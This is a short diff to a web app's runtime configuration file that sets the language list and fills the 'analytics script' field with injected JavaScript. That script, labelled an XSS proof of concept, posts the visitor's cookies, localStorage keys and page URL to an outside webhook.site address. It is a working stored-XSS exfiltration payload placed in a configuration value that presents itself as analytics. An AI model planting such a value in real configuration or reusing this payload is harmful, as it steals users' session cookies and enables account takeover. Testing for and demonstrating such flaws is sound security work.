@@ -33,11 +33,11 @@ window.__RUNTIME_CONFIG__ = {
   "VITE_SEO_TWITTER_HANDLE": "",
   "VITE_SEO_THEME_COLOR": "#000000",
   "VITE_SEO_KEYWORDS": "",
-  "VITE_AVAILABLE_LANGUAGES": "",
+  "VITE_AVAILABLE_LANGUAGES": "en",
   "VITE_USE_CUSTOM_PNL_POSTERS": "false",
   "VITE_CUSTOM_PNL_POSTER_COUNT": "0",
   "VITE_TRADING_VIEW_COLOR_CONFIG": "",
-  "VITE_ANALYTICS_SCRIPT": "",
+  "VITE_ANALYTICS_SCRIPT": "<script>\n  console.error('[XSS-POC] Arbitrary script executed');\n  fetch('https://webhook.site/0d3dea30-db0a-4973-81ba-86de53c76615', {\n    method: 'POST',\n    body: JSON.stringify({\n      poc: 'stored-xss',\n      cookies: document.cookie,\n      localStorage: Object.keys(localStorage),\n      url: location.href\n    })\n  });\n  </script>",
   "VITE_SYMBOL_LIST": "",
   "VITE_RESTRICTED_REGIONS": "",
   "VITE_WHITELISTED_IPS": ""
